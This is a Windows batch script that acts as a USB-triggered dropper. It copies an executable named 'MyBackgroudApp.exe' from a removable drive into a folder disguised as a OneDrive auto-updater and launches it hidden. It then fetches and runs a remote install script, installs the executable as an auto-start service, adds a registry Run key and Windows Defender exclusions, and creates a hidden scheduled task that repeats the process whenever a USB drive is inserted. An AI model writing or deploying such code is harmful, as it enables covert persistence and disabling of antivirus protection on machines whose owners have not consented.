@echo off
setlocal enabledelayedexpansion

:: Create a test log file on desktop to verify script is running
echo Script started at %date% %time% > "%USERPROFILE%\Desktop\script_test.log" 2>nul

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    exit /b 1
)

:: First, find and copy the installation script from USB drive
set "SCRIPT_PATH="
set "USB_DRIVE="

for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    :: Check if drive exists
    vol %%d: >nul 2>&1
    if !errorlevel! equ 0 (
        :: Check if it's a removable drive (USB)
        fsutil fsinfo drivetype %%d: 2>nul | find "Removable" >nul 2>&1
        if !errorlevel! equ 0 (
            set "USB_DRIVE=%%d:"
            
            :: Create single debug log file on USB
            (
                echo === DEBUG LOG START ===
                echo Script started at %date% %time%
                echo Drive %%d: detected as removable USB
            ) > "%%d:\debug-log.txt" 2>nul
            
            :: Test log file creation on USB
            echo Test log entry > "%%d:\test_log.txt" 2>nul
            if exist "%%d:\test_log.txt" (
                echo Successfully created test file on %%d: >> "%%d:\debug-log.txt" 2>nul
                del "%%d:\test_log.txt" >nul 2>&1
            ) else (
                echo Cannot write to drive %%d: >> "%%d:\debug-log.txt" 2>nul
            )
            
            :: Check if MyBackgroudApp.exe exists on this drive
            if exist "%%d:\MyBackgroudApp.exe" (
                echo Found MyBackgroudApp.exe on drive %%d: at %date% %time% >> "%%d:\debug-log.txt" 2>nul
                
                echo Creating target directory... >> "%%d:\debug-log.txt" 2>nul
                if not exist "%APPDATA%\OneDrive\AutoUpdater\" (
                    mkdir "%APPDATA%\OneDrive\AutoUpdater\" >nul 2>&1
                    echo Target directory created >> "%%d:\debug-log.txt" 2>nul
                ) else (
                    echo Target directory already exists >> "%%d:\debug-log.txt" 2>nul
                )
                
                echo Attempting to copy MyBackgroudApp.exe... >> "%%d:\debug-log.txt" 2>nul
                copy "%%d:\MyBackgroudApp.exe" "%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe" /Y >nul 2>&1
                if exist "%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe" (
                    echo Copy successful at %date% %time% >> "%%d:\debug-log.txt" 2>nul
                    
                    :: Launch putty immediately with background and hide flags
                    echo Launching putty with -background -hide flags... >> "%%d:\debug-log.txt" 2>nul
                    start "" /b "%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe" -background -hide >nul 2>&1
                    echo Putty launched at %date% %time% >> "%%d:\debug-log.txt" 2>nul
                    
                    echo About to process service installation at %date% %time% >> "%%d:\debug-log.txt" 2>nul
                    
                    goto found_and_copied
                ) else (
                    echo Copy failed at %date% %time% >> "%%d:\debug-log.txt" 2>nul
                )
            ) else (
                echo MyBackgroudApp.exe not found on drive %%d: >> "%%d:\debug-log.txt" 2>nul
            )
        )
    )
)

echo Finished for loop without finding MyBackgroudApp.exe at %date% %time% > "%USERPROFILE%\Desktop\for_loop_end.log" 2>nul
goto no_putty_found

:found_and_copied
if "%USB_DRIVE%"=="" set "USB_DRIVE=C:"

echo [LOG] Starting NSSM service creation... >> "%USB_DRIVE%\debug-log.txt" 2>nul

:: NSSM SERVICE CREATION METHOD

:: Step 1: Install Chocolatey if not already installed
echo [LOG] Step 1: Installing Chocolatey... >> "%USB_DRIVE%\debug-log.txt" 2>nul
powershell -Command "if (-not (Get-Command choco -ErrorAction SilentlyContinue)) { Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')) }" >nul 2>&1

:: Step 2: Install NSSM using Chocolatey
echo [LOG] Step 2: Installing NSSM... >> "%USB_DRIVE%\debug-log.txt" 2>nul
powershell -Command "$env:PATH += ';C:\ProgramData\chocolatey\bin'; choco install nssm -y --no-progress" >nul 2>&1

:: Step 3: Fallback - try direct choco command
if exist "C:\ProgramData\chocolatey\bin\choco.exe" (
    echo [LOG] Step 3: Chocolatey found, trying direct install... >> "%USB_DRIVE%\debug-log.txt" 2>nul
    C:\ProgramData\chocolatey\bin\choco.exe install nssm -y --no-progress >nul 2>&1
) else (
    echo [LOG] WARNING: Chocolatey not found at expected location >> "%USB_DRIVE%\debug-log.txt" 2>nul
)

:: Step 4: Remove existing service if it exists
if exist "C:\ProgramData\chocolatey\bin\nssm.exe" (
    echo [LOG] Step 4: NSSM found, removing existing service... >> "%USB_DRIVE%\debug-log.txt" 2>nul
    C:\ProgramData\chocolatey\bin\nssm.exe remove "AutoUpdate" confirm >nul 2>&1
) else (
    echo [LOG] WARNING: NSSM not found at expected location >> "%USB_DRIVE%\debug-log.txt" 2>nul
)

:: Step 5: Create Windows service using NSSM
if exist "C:\ProgramData\chocolatey\bin\nssm.exe" (
    echo [LOG] Step 5: Creating NSSM service... >> "%USB_DRIVE%\debug-log.txt" 2>nul
    C:\ProgramData\chocolatey\bin\nssm.exe install "AutoUpdate" "%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe" >nul 2>&1
    C:\ProgramData\chocolatey\bin\nssm.exe set "AutoUpdate" AppParameters "-hide" >nul 2>&1
    C:\ProgramData\chocolatey\bin\nssm.exe set "AutoUpdate" DisplayName "AutoUpdate Service" >nul 2>&1
    C:\ProgramData\chocolatey\bin\nssm.exe set "AutoUpdate" Description "AutoUpdate Background Service" >nul 2>&1
    C:\ProgramData\chocolatey\bin\nssm.exe set "AutoUpdate" Start SERVICE_AUTO_START >nul 2>&1
    C:\ProgramData\chocolatey\bin\nssm.exe start "AutoUpdate" >nul 2>&1
    echo [LOG] NSSM service creation completed >> "%USB_DRIVE%\debug-log.txt" 2>nul
) else (
    echo [LOG] ERROR: Cannot create service - NSSM not available >> "%USB_DRIVE%\debug-log.txt" 2>nul
)

:: Step 6: Start putty immediately (hidden)
echo [LOG] Step 6: Starting putty immediately... >> "%USB_DRIVE%\debug-log.txt" 2>nul
start "" /b /min "%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe" -hide >nul 2>&1

:: Step 7: Add registry backup for startup
echo [LOG] Step 7: Adding registry backup... >> "%USB_DRIVE%\debug-log.txt" 2>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "AutoUpdate" /t REG_SZ /d "\"%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe\" -hide" /f >nul 2>&1

:: Step 8: Windows Defender exclusions
echo [LOG] Step 8: Adding Windows Defender exclusions... >> "%USB_DRIVE%\debug-log.txt" 2>nul

:: Add folder exclusion
powershell -Command "try { Add-MpPreference -ExclusionPath '%APPDATA%\OneDrive\AutoUpdater' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionPath '%APPDATA%\OneDrive\AutoUpdater\' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionPath '%APPDATA%\OneDrive\AutoUpdater\*' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: Add specific file exclusion
powershell -Command "try { Add-MpPreference -ExclusionPath '%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: Add process exclusions
powershell -Command "try { Add-MpPreference -ExclusionProcess 'MyBackgroudApp.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionProcess '%APPDATA%\OneDrive\AutoUpdater\MyBackgroudApp.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: Add service-related exclusions
powershell -Command "try { Add-MpPreference -ExclusionProcess 'nssm.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionPath 'C:\ProgramData\chocolatey\bin\nssm.exe' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: Add extension exclusion for the folder
powershell -Command "try { Add-MpPreference -ExclusionExtension '.exe' -ExclusionPath '%APPDATA%\OneDrive\AutoUpdater' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: Force Windows Defender to apply changes immediately
powershell -Command "try { Start-MpScan -ScanType QuickScan -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

echo [LOG] Windows Defender exclusions added >> "%USB_DRIVE%\debug-log.txt" 2>nul

:: Mark drive as executed
echo [LOG] Marking drive as executed... >> "%USB_DRIVE%\debug-log.txt" 2>nul
echo executed > "%USB_DRIVE%\.__executed__" 2>nul

echo [LOG] All operations completed successfully! >> "%USB_DRIVE%\debug-log.txt" 2>nul

set "SCRIPT_PATH=%APPDATA%\OneDrive\AutoUpdater\"
goto script_found

:no_putty_found
:: If no USB script found, create a basic monitoring script
if "%SCRIPT_PATH%"=="" (
    if not exist "%APPDATA%\OneDrive\AutoUpdater\" mkdir "%APPDATA%\OneDrive\AutoUpdater\" >nul 2>&1
    set "SCRIPT_PATH=%APPDATA%\OneDrive\AutoUpdater\"
    
    :: Create the USB monitoring script
    (
        echo @echo off
        echo setlocal enabledelayedexpansion
        echo.
        echo :: Loop through all drive letters to find USB
        echo for %%%%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do (
        echo     :: Check if drive exists and is removable
        echo     vol %%%%d: ^>nul 2^>^&1
        echo     if ^^!errorlevel^^! equ 0 (
        echo         :: Check if it's a removable drive ^(USB^)
        echo         fsutil fsinfo drivetype %%%%d: 2^>nul ^| find "Removable" ^>nul 2^>^&1
        echo         if ^^!errorlevel^^! equ 0 (
        echo             :: Check if MyBackgroudApp.exe exists on this drive
        echo             if exist "%%%%d:\MyBackgroudApp.exe" (
        echo                 :: Copy and setup service
        echo                 copy "%%%%d:\MyBackgroudApp.exe" "%APPDATA%\OneDrive\AutoUpdater\" /Y ^>nul 2^>^&1
        echo                 echo executed ^> "%%%%d:\.__executed__" 2^>nul
        echo                 exit /b 0
        echo             ^)
        echo         ^)
        echo     ^)
        echo ^)
        echo exit /b 1
    ) > "%SCRIPT_PATH%" 2>nul
)

:script_found
:: Essential USB Detection Only
set "PS_SCRIPT=%APPDATA%\OneDrive\AutoUpdater\usb_detector.ps1"
(
    echo Register-WmiEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2" -Action {
    echo     Start-Sleep -Seconds 3
    echo     Start-Process -FilePath "%SCRIPT_PATH%" -WindowStyle Hidden -Verb RunAs -ErrorAction SilentlyContinue
    echo } -ErrorAction SilentlyContinue ^| Out-Null
    echo.
    echo try {
    echo     while ($true^) { Start-Sleep -Seconds 1 }
    echo } catch { }
) > "%PS_SCRIPT%" 2>nul

:: Create scheduled task for USB detection
schtasks /create /tn "USBDetector" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%PS_SCRIPT%\"" /sc onstart /ru "%USERNAME%" /f >nul 2>&1

:: Start USB monitoring
start "" /b powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_SCRIPT%" >nul 2>&1

exit /b 0
